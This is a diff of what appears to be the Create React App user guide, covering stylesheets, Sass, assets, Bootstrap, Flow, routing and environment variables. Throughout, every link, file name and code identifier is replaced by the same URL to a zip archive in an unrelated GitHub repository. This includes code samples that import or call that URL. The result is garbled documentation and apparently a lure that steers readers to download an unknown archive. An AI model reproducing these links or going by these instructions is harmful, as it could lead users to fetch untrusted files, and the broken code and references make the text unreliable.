+import 'https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip'; // Tell Webpack that https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip uses these styles
 
 class Button extends Component {
   render() {
@@ -506,15 +506,15 @@ class Button extends Component {
 }
 ```
 
-**This is not required for React** but many people find this feature convenient. You can read about the benefits of this approach [here](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip). However you should be aware that this makes your code less portable to other build tools and environments than Webpack.
+**This is not required for React** but many people find this feature convenient. You can read about the benefits of this approach [here](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip). However you should be aware that this makes your code less portable to other build tools and environments than Webpack.
 
 In development, expressing dependencies this way allows your styles to be reloaded on the fly as you edit them. In production, all CSS files will be concatenated into a single minified `.css` file in the build output.
 
-If you are concerned about using Webpack-specific semantics, you can put all your CSS right into `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`. It would still be imported from `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, but you could always remove that import if you later migrate to a different build tool.
+If you are concerned about using Webpack-specific semantics, you can put all your CSS right into `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`. It would still be imported from `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, but you could always remove that import if you later migrate to a different build tool.
 
 ## Post-Processing CSS
 
-This project setup minifies your CSS and adds vendor prefixes to it automatically through [Autoprefixer](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) so you don’t need to worry about it.
+This project setup minifies your CSS and adds vendor prefixes to it automatically through [Autoprefixer](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) so you don’t need to worry about it.
 
 For example, this:
 
@@ -543,11 +543,11 @@ becomes this:
 }
 ```
 
-If you need to disable autoprefixing for some reason, [follow this section](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+If you need to disable autoprefixing for some reason, [follow this section](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 ## Adding a CSS Preprocessor (Sass, Less etc.)
 
-Generally, we recommend that you don’t reuse the same CSS classes across different components. For example, instead of using a `.Button` CSS class in `<AcceptButton>` and `<RejectButton>` components, we recommend creating a `<Button>` component with its own `.Button` styles, that both `<AcceptButton>` and `<RejectButton>` can render (but [not inherit](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)).
+Generally, we recommend that you don’t reuse the same CSS classes across different components. For example, instead of using a `.Button` CSS class in `<AcceptButton>` and `<RejectButton>` components, we recommend creating a `<Button>` component with its own `.Button` styles, that both `<AcceptButton>` and `<RejectButton>` can render (but [not inherit](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)).
 
 Following this rule often makes CSS preprocessors less useful, as features like mixins and nesting are replaced by component composition. You can, however, integrate a CSS preprocessor if you find it valuable. In this walkthrough, we will be using Sass, but you can also use Less, or another alternative.
 
@@ -563,7 +563,7 @@ Alternatively you may use `yarn`:
 yarn add node-sass-chokidar
 ```
 
-Then in `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, add the following lines to `scripts`:
+Then in `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, add the following lines to `scripts`:
 
 ```diff
    "scripts": {
@@ -576,11 +576,11 @@ Then in `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Fro
 
 >Note: To use a different preprocessor, replace `build-css` and `watch-css` commands according to your preprocessor’s documentation.
 
-Now you can rename `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` to `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` and run `npm run watch-css`. The watcher will find every Sass file in `src` subdirectories, and create a corresponding CSS file next to it, in our case overwriting `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`. Since `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` still imports `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, the styles become a part of your application. You can now edit `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, and `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` will be regenerated.
+Now you can rename `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` to `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` and run `npm run watch-css`. The watcher will find every Sass file in `src` subdirectories, and create a corresponding CSS file next to it, in our case overwriting `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`. Since `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` still imports `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, the styles become a part of your application. You can now edit `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, and `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` will be regenerated.
 
-To share variables between Sass files, you can use Sass imports. For example, `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` and other component style files could include `@import "https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip";` with variable definitions.
+To share variables between Sass files, you can use Sass imports. For example, `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` and other component style files could include `@import "https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip";` with variable definitions.
 
-To enable importing files without using relative paths, you can add the  `--include-path` option to the command in `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`.
+To enable importing files without using relative paths, you can add the  `--include-path` option to the command in `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`.
 
 ```
 "build-css": "node-sass-chokidar --include-path ./src --include-path ./node_modules src/ -o src/",
@@ -590,7 +590,7 @@ To enable importing files without using relative paths, you can add the  `--incl
 This will allow you to do imports like
 
 ```scss
-@import 'https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip'; // assuming a styles directory under src/
+@import 'https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip'; // assuming a styles directory under src/
 @import 'nprogress/nprogress'; // importing a css file from the nprogress node module
 ```
 
@@ -633,9 +633,9 @@ Now running `npm start` and `npm run build` also builds Sass files.
 
 - `node-sass --watch` has been reported to have *performance issues* in certain conditions when used in a virtual machine or with docker.
 
-- Infinite styles compiling [#1939](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+- Infinite styles compiling [#1939](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
-- `node-sass` has been reported as having issues with detecting new files in a directory [#1891](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+- `node-sass` has been reported as having issues with detecting new files in a directory [#1891](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
  `node-sass-chokidar` is used here as it addresses these issues.
 
@@ -645,15 +645,15 @@ With Webpack, using static assets like images and fonts works similarly to CSS.
 
 You can **`import` a file right in a JavaScript module**. This tells Webpack to include that file in the bundle. Unlike CSS imports, importing a file gives you a string value. This value is the final path you can reference in your code, e.g. as the `src` attribute of an image or the `href` of a link to a PDF.
 
-To reduce the number of requests to the server, importing images that are less than 10,000 bytes returns a [data URI](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) instead of a path. This applies to the following file extensions: bmp, gif, jpg, jpeg, and png. SVG files are excluded due to [#1153](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+To reduce the number of requests to the server, importing images that are less than 10,000 bytes returns a [data URI](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) instead of a path. This applies to the following file extensions: bmp, gif, jpg, jpeg, and png. SVG files are excluded due to [#1153](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 Here is an example:
 
 ```js
 import React from 'react';
-import logo from 'https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip'; // Tell Webpack this JS file uses this image
+import logo from 'https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip'; // Tell Webpack this JS file uses this image
 
-https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(logo); // https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(logo); // https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
 
 function Header() {
   // Import result is the URL of your image
@@ -669,7 +669,7 @@ This works in CSS too:
 
 ```css
 .Logo {
-  background-image: url(https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip);
+  background-image: url(https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip);
 }
 ```
 
@@ -705,24 +705,24 @@ However there is an **escape hatch** that you can use to add an asset outside of
 
 If you put a file into the `public` folder, it will **not** be processed by Webpack. Instead it will be copied into the build folder untouched.   To reference assets in the `public` folder, you need to use a special variable called `PUBLIC_URL`.
 
-Inside `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, you can use it like this:
+Inside `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, you can use it like this:
 
 ```html
-<link rel="shortcut icon" href="%PUBLIC_URL%https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip">
+<link rel="shortcut icon" href="%PUBLIC_URL%https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip">
 ```
 
 Only files inside the `public` folder will be accessible by `%PUBLIC_URL%` prefix. If you need to use a file from `src` or `node_modules`, you’ll have to copy it there to explicitly specify your intention to make this file a part of the build.
 
 When you run `npm run build`, Create React App will substitute `%PUBLIC_URL%` with a correct absolute path so your project works even if you use client-side routing or host it at a non-root URL.
 
-In JavaScript code, you can use `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` for similar purposes:
+In JavaScript code, you can use `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` for similar purposes:
 
 ```js
 render() {
   // Note: this is an escape hatch and should be used sparingly!
   // Normally we recommend using `import` for getting asset URLs
   // as described in “Adding Images and Fonts” above this section.
-  return <img src={https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip + 'https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip'} />;
+  return <img src={https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip + 'https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip'} />;
 }
 ```
 
@@ -737,9 +737,9 @@ Keep in mind the downsides of this approach:
 Normally we recommend importing [stylesheets](#adding-a-stylesheet), [images, and fonts](#adding-images-fonts-and-files) from JavaScript.
 The `public` folder is useful as a workaround for a number of less common cases:
 
-* You need a file with a specific name in the build output, such as [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+* You need a file with a specific name in the build output, such as [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 * You have thousands of images and need to dynamically reference their paths.
-* You want to include a small script like [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) outside of the bundled code.
+* You want to include a small script like [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) outside of the bundled code.
 * Some library may be incompatible with Webpack and you have no other option but to include it as a `<script>` tag.
 
 Note that if you add a `<script>` that declares global variables, you also need to read the next section on using them.
@@ -760,7 +760,7 @@ Alternatively, you can force the linter to ignore any line by adding `// eslint-
 
 ## Adding Bootstrap
 
-You don’t have to use [React Bootstrap](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) together with React but it is a popular library for integrating Bootstrap with React apps. If you need it, you can integrate it with Create React App by following these steps:
+You don’t have to use [React Bootstrap](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) together with React but it is a popular library for integrating Bootstrap with React apps. If you need it, you can integrate it with Create React App by following these steps:
 
 Install React Bootstrap and Bootstrap from npm. React Bootstrap does not include Bootstrap CSS so this needs to be installed as well:
 
@@ -774,22 +774,22 @@ Alternatively you may use `yarn`:
 yarn add react-bootstrap bootstrap@3
 ```
 
-Import Bootstrap CSS and optionally Bootstrap theme CSS in the beginning of your ```https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip``` file:
+Import Bootstrap CSS and optionally Bootstrap theme CSS in the beginning of your ```https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip``` file:
 
 ```js
-import 'https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip';
-import 'https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip';
+import 'https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip';
+import 'https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip';
 // Put any other imports below so that CSS from your
 // components takes precedence over default styles.
 ```
 
-Import required React Bootstrap components within ```https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip``` file or your custom component files:
+Import required React Bootstrap components within ```https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip``` file or your custom component files:
 
 ```js
 import { Navbar, Jumbotron, Button } from 'react-bootstrap';
 ```
 
-Now you are ready to use the imported React Bootstrap components within your component hierarchy defined in the render method. Here is an example [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) redone using React Bootstrap.
+Now you are ready to use the imported React Bootstrap components within your component hierarchy defined in the render method. Here is an example [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) redone using React Bootstrap.
 
 ### Using a Custom Theme
 
@@ -800,30 +800,30 @@ We suggest the following approach:
 * Add the necessary build steps to tweak the theme, and publish your package on npm.
 * Install your own theme npm package as a dependency of your app.
 
-Here is an example of adding a [customized Bootstrap](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) that follows these steps.
+Here is an example of adding a [customized Bootstrap](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) that follows these steps.
 
 ## Adding Flow
 
-Flow is a static type checker that helps you write code with fewer bugs. Check out this [introduction to using static types in JavaScript](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) if you are new to this concept.
+Flow is a static type checker that helps you write code with fewer bugs. Check out this [introduction to using static types in JavaScript](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) if you are new to this concept.
 
-Recent versions of [Flow](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) work with Create React App projects out of the box.
+Recent versions of [Flow](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) work with Create React App projects out of the box.
 
 To add Flow to a Create React App project, follow these steps:
 
 1. Run `npm install --save flow-bin` (or `yarn add flow-bin`).
-2. Add `"flow": "flow"` to the `scripts` section of your `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`.
-3. Run `npm run flow init` (or `yarn flow init`) to create a [`.flowconfig` file](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) in the root directory.
-4. Add `// @flow` to any files you want to type check (for example, to `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`).
+2. Add `"flow": "flow"` to the `scripts` section of your `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`.
+3. Run `npm run flow init` (or `yarn flow init`) to create a [`.flowconfig` file](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) in the root directory.
+4. Add `// @flow` to any files you want to type check (for example, to `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`).
 
 Now you can run `npm run flow` (or `yarn flow`) to check the files for type errors.
-You can optionally use an IDE like [Nuclide](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) for a better integrated experience.
+You can optionally use an IDE like [Nuclide](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) for a better integrated experience.
 In the future we plan to integrate it into Create React App even more closely.
 
-To learn more about Flow, check out [its documentation](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+To learn more about Flow, check out [its documentation](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 ## Adding a Router
 
-Create React App doesn't prescribe a specific routing solution, but [React Router](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) is the most popular one.
+Create React App doesn't prescribe a specific routing solution, but [React Router](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) is the most popular one.
 
 To add it, run:
 
@@ -837,7 +837,7 @@ Alternatively you may use `yarn`:
 yarn add react-router-dom
 ```
 
-To try it, delete all the code in `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` and replace it with any of the examples on its website. The [Basic Example](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) is a good place to get started.
+To try it, delete all the code in `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` and replace it with any of the examples on its website. The [Basic Example](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) is a good place to get started.
 
 Note that [you may need to configure your production server to support client-side routing](#serving-apps-with-client-side-routing) before deploying your app.
 
@@ -851,12 +851,12 @@ default you will have `NODE_ENV` defined for you, and any other environment vari
 
 **The environment variables are embedded during the build time**. Since Create React App produces a static HTML/CSS/JS bundle, it can’t possibly read them at runtime. To read them at runtime, you would need to load HTML into memory on the server and replace placeholders in runtime, just like [described here](#injecting-data-from-the-server-into-the-page). Alternatively you can rebuild the app on the server anytime you change them.
 
->Note: You must create custom environment variables beginning with `REACT_APP_`. Any other variables except `NODE_ENV` will be ignored to avoid accidentally [exposing a private key on the machine that could have the same name](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip). Changing any environment variables will require you to restart the development server if it is running.
+>Note: You must create custom environment variables beginning with `REACT_APP_`. Any other variables except `NODE_ENV` will be ignored to avoid accidentally [exposing a private key on the machine that could have the same name](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip). Changing any environment variables will require you to restart the development server if it is running.
 
-These environment variables will be defined for you on `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`. For example, having an environment
-variable named `REACT_APP_SECRET_CODE` will be exposed in your JS as `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`.
+These environment variables will be defined for you on `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`. For example, having an environment
+variable named `REACT_APP_SECRET_CODE` will be exposed in your JS as `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`.
 
-There is also a special built-in environment variable called `NODE_ENV`. You can read it from `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`. When you run `npm start`, it is always equal to `'development'`, when you run `npm test` it is always equal to `'test'`, and when you run `npm run build` to make a production bundle, it is always equal to `'production'`. **You cannot override `NODE_ENV` manually.** This prevents developers from accidentally deploying a slow development build to production.
+There is also a special built-in environment variable called `NODE_ENV`. You can read it from `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`. When you run `npm start`, it is always equal to `'development'`, when you run `npm test` it is always equal to `'test'`, and when you run `npm run build` to make a production bundle, it is always equal to `'production'`. **You cannot override `NODE_ENV` manually.** This prevents developers from accidentally deploying a slow development build to production.
 
 These environment variables can be useful for displaying information conditionally based on where the project is
 deployed or consuming sensitive data that lives outside of version control.
@@ -868,16 +868,16 @@ in the environment inside a `<form>`:
 render() {
   return (
     <div>
-      <small>You are running this application in <b>{https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip}</b> mode.</small>
+      <small>You are running this application in <b>{https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip}</b> mode.</small>
       <form>
-        <input type="hidden" defaultValue={https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip} />
+        <input type="hidden" defaultValue={https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip} />
       </form>
     </div>
   );
 }
 ```
 
-During the build, `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` will be replaced with the current value of the `REACT_APP_SECRET_CODE` environment variable. Remember that the `NODE_ENV` variable will be set for you automatically.
+During the build, `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` will be replaced with the current value of the `REACT_APP_SECRET_CODE` environment variable. Remember that the `NODE_ENV` variable will be set for you automatically.
 
 When you load the app in the browser and inspect the `<input>`, you will see its value set to `abcdef`, and the bold text will show the environment provided when using `npm start`:
 
@@ -897,8 +897,8 @@ a `.env` file. Both of these ways are described in the next few sections.
 Having access to the `NODE_ENV` is also useful for performing actions conditionally:
 
 ```js
-if (https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip !== 'production') {
-  https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip();
+if (https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip !== 'production') {
+  https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip();
 }
 ```
 
@@ -908,7 +908,7 @@ When you compile the app with `npm run build`, the minification step will strip 
 
 >Note: this feature is available with `react-scripts@0.9.0` and higher.
 
-You can also access the environment variables starting with `REACT_APP_` in the `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`. For example:
+You can also access the environment variables starting with `REACT_APP_` in the `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`. For example:
 
 ```html
 <title>%REACT_APP_WEBSITE_NAME%</title>
@@ -924,7 +924,7 @@ Note that the caveats from the above section apply:
 Defining environment variables can vary between OSes. It’s also important to know that this manner is temporary for the
 life of the shell session.
 
-#### Windows (https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+#### Windows (https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 ```cmd
 set "REACT_APP_SECRET_CODE=abcdef" && npm start
@@ -953,7 +953,7 @@ To define permanent environment variables, create a file called `.env` in the ro
 ```
 REACT_APP_SECRET_CODE=abcdef
 ```
->Note: You must create custom environment variables beginning with `REACT_APP_`. Any other variables except `NODE_ENV` will be ignored to avoid [accidentally exposing a private key on the machine that could have the same name](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip). Changing any environment variables will require you to restart the development server if it is running.
+>Note: You must create custom environment variables beginning with `REACT_APP_`. Any other variables except `NODE_ENV` will be ignored to avoid [accidentally exposing a private key on the machine that could have the same name](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip). Changing any environment variables will require you to restart the development server if it is running.
 
 `.env` files **should be** checked into source control (with the exclusion of `.env*.local`).
 
@@ -962,27 +962,27 @@ REACT_APP_SECRET_CODE=abcdef
 >Note: this feature is **available with `react-scripts@1.0.0` and higher**.
 
 * `.env`: Default.
-* `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`: Local overrides. **This file is loaded for all environments except test.**
-* `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`: Environment-specific settings.
-* `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`: Local overrides of environment-specific settings.
+* `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`: Local overrides. **This file is loaded for all environments except test.**
+* `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`: Environment-specific settings.
+* `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`: Local overrides of environment-specific settings.
 
 Files on the left have more priority than files on the right:
 
-* `npm start`: `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, `.env`
-* `npm run build`: `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, `.env`
-* `npm test`: `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, `.env` (note `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` is missing)
